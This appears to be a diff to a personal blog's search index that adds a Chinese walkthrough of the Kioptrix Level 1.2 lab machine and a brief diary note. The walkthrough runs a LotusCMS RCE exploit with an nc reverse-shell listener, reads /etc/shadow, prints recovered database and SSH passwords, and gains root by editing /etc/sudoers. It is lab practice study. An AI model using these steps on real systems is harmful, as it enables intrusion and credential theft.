@@ -185,6 +185,187 @@
       </tags>
   </entry>
   <entry>
+    <title>Kioptrix Level 1.2(#3)</title>
+    <url>/2024/02/11/Kioptrix_Level_1.2/</url>
+    <content><![CDATA[<h1 id="kioptrix-level-123"><a class="markdownIt-Anchor" href="#kioptrix-level-123"></a> Kioptrix Level 1.2(#3)</h1>
+<h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2>
+<h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3>
+<ul>
+<li>nmap扫描ip，得到IP为<code>192.168.89.139</code></li>
+<li>nmap扫描端口以及端口服务</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 00:12 EST</span><br><span class="line">Nmap scan report for 192.168.89.139</span><br><span class="line">Host is up (0.0025s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds</span><br></pre></td></tr></table></figure>
+<p>发现开放了ssh和http服务</p>
+<ul>
+<li>浏览器访问<code>http://192.168.89.139</code></li>
+</ul>
+<img src="/2024/02/11/Kioptrix_Level_1.2/截屏2024-02-13_下午8.24.57.png" alt="截屏2024-02-13_下午8.24.57" style="zoom:67%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<ul>
+<li>点击Login，发现一个登录界面，<code>Proudly Powered by:LotusCMS</code>，<strong>LotusCMS</strong>是关键，CMS（Content  Management System 内容管理系统）</li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.25.32.png" alt="截屏2024-02-13_下午8.25.32" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><em>看到登录框，想起上一道题，可能存在sql注入</em></p>
+<ul>
+<li>dirsearch扫描网址：<code>dirsearch --url http://192.168.89.139</code></li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.36.19.png" alt="截屏2024-02-13_下午8.36.19" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><strong>发现了一个phpmyadmin，还有一个gallery</strong></p>
+<ul>
+<li>查看<code>http://192.168.89.139/phpmyadmin/</code>，<strong>需要拿到root密码</strong></li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.57.06.png" alt="截屏2024-02-13_下午9.57.06" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><em>由之前信息收集阶段的结果可知 phpmyadmin 的版本为 <strong>2.11.3</strong>，搜索可知该版本存在&quot;万能密码&quot;,使用 <strong>‘localhost’@'@&quot;</strong> 即可登陆，但是只有一个 <strong>information_schema</strong> ，没什么用</em></p>
+<blockquote>
+<p><a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#lotuscms">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></p>
+</blockquote>
+<ul>
+<li>查看<code>http://192.168.89.139/gallery/</code>，dirsearch扫一下目录</li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.58.54.png" alt="截屏2024-02-13_下午8.58.54" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<ul>
+<li>发现了一个后台/gallery/gadmin，<strong>Username为admin</strong>，一个db.sql文件<img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.00.18.png" alt="截屏2024-02-13_下午9.00.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></li>
+</ul>
+<p><strong>后台可以尝试sql注入</strong></p>
+<p><strong>db.sql部分文件内容如下：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `gallarific_users` (</span><br><span class="line">  `userid` int(11) NOT NULL auto_increment,</span><br><span class="line">  `username` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `password` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `usertype` enum(&#x27;superuser&#x27;,&#x27;normaluser&#x27;) NOT NULL default &#x27;superuser&#x27;,</span><br><span class="line">  `firstname` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `lastname` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `email` varchar(255) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `datejoined` int(11) NOT NULL default &#x27;0&#x27;,</span><br><span class="line">  `website` varchar(255) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `issuperuser` tinyint(4) NOT NULL default &#x27;0&#x27;,</span><br><span class="line">  `photo` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `joincode` varchar(20) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  PRIMARY KEY  (`userid`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<h4 id="总结突破方向cmsweb"><a class="markdownIt-Anchor" href="#总结突破方向cmsweb"></a> 总结突破方向——cms+web</h4>
+<ul>
+<li>
+<p>Login是否存在sql注入</p>
+</li>
+<li>
+<p>LotusCMS 是否存在可利用的漏洞</p>
+</li>
+<li>
+<p>是否能拿到phpmyadmin后台的root用户密码，查看数据库信息</p>
+</li>
+<li>
+<p>/gallery/gadmin是否存在sql注入</p>
+</li>
+</ul>
+<h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3>
+<h4 id="lotuscms漏洞利用"><a class="markdownIt-Anchor" href="#lotuscms漏洞利用"></a> lotusCMS漏洞利用</h4>
+<ul>
+<li>
+<p>在github中找到python利用的lotuscms3.0RCE漏洞：<a href="https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit">https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit</a></p>
+</li>
+<li>
+<p>nc监听444端口:<code> nc -nvlp 444</code>，同时执行<code> python lotuscms.py -rh 192.168.89.139 -lh 192.168.89.137</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help  show this help message and exit.</span><br><span class="line">-rh RHOST   Target Host.</span><br><span class="line">-rp RPORT   Target Port. Default: 80.</span><br><span class="line">-u URI      URI (i.e /lms/. Default: /</span><br><span class="line">-lh LHOST   Local Host.</span><br><span class="line">-lp LPORT   Local Port. Default: 444</span><br><span class="line">-s          SSL/TLS enable (True/False). Default: False</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229153523165.png" alt="image-20240229153523165" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><strong>成功拿到www-data，但是这只是一个普通用户权限，由于我们扫出了重要的网站后台，先利用这个用户权限，查看网站源文件，看是否存在敏感信息</strong></p>
+</li>
+<li>
+<p>通过www-data，我们可以查看/etc/passwd /etc/shadow，这些信息，<em>里面能看到后面能查到的dreg和loneferret两个用户</em></p>
+</li>
+<li>
+<p>在网页根目录中查找敏感信息，通过<code>cat gconfig.php</code>成功看到mysql的username和password，可以直接登录phpmyadmin了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>拿到phpmyadmin后台root密码后，登录后台，看到一些<strong>数据库信息</strong></p>
+</li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.34.41.png" alt="截屏2024-02-13_下午8.34.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<ul>
+<li>可以看到我们要找的gallery数据库，gallarific_users这张表，也就是gallery/gadmin后台的登录用户名和密码</li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.15.57.png" alt="截屏2024-02-13_下午9.15.57" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><strong>拿到password <code>n0t7t1k4</code></strong></p>
+<p>利用<code>admin </code>和<code>n0t7t1k4</code>登录网站后台gallery/gadmin，但是发现网站里面，没有什么特别的东西，<em>其实可以看到一些上传功能和评论功能，可以试试，这里不赘述。</em></p>
+<ul>
+<li>继续翻找phpmyadmin，发现了一个叫做dev_accounts的表，里面存了username和password，这两个用户我们在之前通过www-data，查看用户列表时看到过，因此如果破解了密码可以利用<code>ssh</code>登录</li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229194301766.png" alt="image-20240229194301766" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<ul>
+<li>通过<code>md5</code>解密，得到账户信息 [md5在线解密](<a href="https://www.cmd5.com/default.aspx?hashtype=md5&amp;answer=cWluZ21pbmcxMTI0MTUu">md5在线解密破解,md5解密加密 (cmd5.com)</a>)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dreg Mast3r</span><br><span class="line">loneferret starwars</span><br></pre></td></tr></table></figure>
+<p><em>看到别人的walkthrough发现这里也可以hydra爆破，详情请看  <a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></em></p>
+<ul>
+<li>目标主机开了ssh服务，尝试利用ssh登录</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss dreg@192.168.89.139</span><br><span class="line">ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.89.139</span><br></pre></td></tr></table></figure>
+<p><em>直接ssh，会导致报错，原因大概是对方使用的ssh版本比较低，详情请看<a href="https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss">SSH 返回：未找到匹配的主机密钥类型。他们的报价：ssh-dss - 询问 Ubuntu (askubuntu.com)</a></em></p>
+<h4 id="简单查看两个用户的权限"><a class="markdownIt-Anchor" href="#简单查看两个用户的权限"></a> 简单查看两个用户的权限</h4>
+<ul>
+<li><code>sudo -l</code> 查看当前用户有哪些被sudo服务授权的命令，<strong>可以发现loneferret下ht和su</strong></li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229202721535.png" alt="image-20240229202721535" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><em>按理说，我们直接<code>sudo su root</code>就可以直接切换成root，但是发现su的路径貌似写错了，正确的应该是<code>/bin/su</code></em></p>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/Screenshot2024-02-29_21.03.16.png" alt="Screenshot2024-02-29_21.03.16" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<h5 id="提权思路"><a class="markdownIt-Anchor" href="#提权思路"></a> 提权思路</h5>
+<ul>
+<li>
+<p>利用内核信息提权</p>
+</li>
+<li>
+<p>SUID提权：直接利用<code>sudo ht</code>编辑<code>/etc/sudoers</code>文件提权</p>
+</li>
+</ul>
+<h3 id="权限提升-privilege-escalation"><a class="markdownIt-Anchor" href="#权限提升-privilege-escalation"></a> 权限提升 privilege escalation</h3>
+<h4 id="利用les工具内核提权"><a class="markdownIt-Anchor" href="#利用les工具内核提权"></a> 利用LES工具内核提权</h4>
+<blockquote>
+<p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester：Linux 权限升级审计工具 (github.com)</a></p>
+<p>LES 工具旨在帮助检测给定 Linux 内核/基于 Linux 的机器的安全缺陷。</p>
+</blockquote>
+<ul>
+<li>利用les工具，查看系统是否有漏洞</li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229161417872.png" alt="image-20240229161417872" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<ul>
+<li>
+<p>先通过<code>uname -a</code>查看系统信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU /Linux  </span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>在kali中<code>bash ./les.sh --uname &quot;Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux&quot;</code></p>
+</li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229162455063.png" alt="image-20240229162455063" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<ul>
+<li>发现可以直接用脏牛，但具体没实现出来，因为两个用户都有很多权限限制
+<ul>
+<li>可以利用msf中的后渗透meterpreter上传，<em>但由于oscp限制msf的使用，这里不叙述，感兴趣的可以查看这篇文章的内核提权部分 <a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></em></li>
+</ul>
+</li>
+</ul>
+<h4 id="suid提权"><a class="markdownIt-Anchor" href="#suid提权"></a> SUID提权</h4>
+<blockquote>
+<p>关于SUID提权的介绍与总结：<a href="https://cloud.tencent.com/developer/article/1878212">对Linux—suid提权的一些总结-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+</blockquote>
+<ul>
+<li>查看ht是否具有suid，<code>ls -al /usr/local/bin/ht</code>，发现rws，s表示具有suid，果然</li>
+<li>直接<code>ht</code>，修改<code>/etc/sudoers</code>，添加<code>/bin/bash</code>或修改su的路径为<code>!/bin/su</code></li>
+<li>这里我的kali很奇怪，直接ht里面修改会导致<strong>segmentation fault</strong>，只能通过<code>sudo ht /etc/sudoers</code>，而且得改二进制才行😓，搞了很久🤮。最后直接把lonferret改成了ALL=（ALL）ALL</li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229221121593.png" alt="image-20240229221121593" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<ul>
+<li>然后就直接<code>sudo su root</code>，<strong>成功拿到root</strong></li>
+</ul>
+<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229221244697.png" alt="image-20240229221244697" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<h2 id="参考列表"><a class="markdownIt-Anchor" href="#参考列表"></a> 参考列表</h2>
+<blockquote>
+<p><a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.cnblogs.com/wsec/p/vulhub0x03.html">0×03 Vulnhub 靶机渗透总结之 KIOPTRIX: LEVEL 1.2 (#3) SQL注入+sudo提权 - wsec - 博客园 (cnblogs.com)</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester：Linux 权限升级审计工具 (github.com)</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://cloud.tencent.com/developer/article/1878212">对Linux—suid提权的一些总结-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>类OSCP靶机练习</category>
+      </categories>
+      <tags>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Kioptrix Level 1</title>
     <url>/2024/01/29/Kioptrix_Level_1/</url>
     <content><![CDATA[<h1 id="kioptrix-level-1"><a class="markdownIt-Anchor" href="#kioptrix-level-1"></a> Kioptrix Level 1</h1>
@@ -310,6 +491,25 @@
       </categories>
       <tags>
         <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mad1sun_bad_days</title>
+    <url>/2024/02/29/Mad1sun-bad-days/</url>
+    <content><![CDATA[<h1 id="mad1sun的倒霉日常"><a class="markdownIt-Anchor" href="#mad1sun的倒霉日常"></a> Mad1sun的倒霉日常</h1>
+<blockquote>
+<p>持续更新中…</p>
+</blockquote>
+<h2 id="2024229"><a class="markdownIt-Anchor" href="#2024229"></a> 2024.2.29</h2>
+<ul>
+<li>在这个四年一度的日子里，我和我朋友的伞被偷了，刚从家带来的小花伞，被偷了，呜呜😭</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Mad1sun的生活小日记</category>
+      </categories>
+      <tags>
+        <tag>Mad1sun倒霉蛋的日常</tag>
       </tags>
   </entry>
 </search>
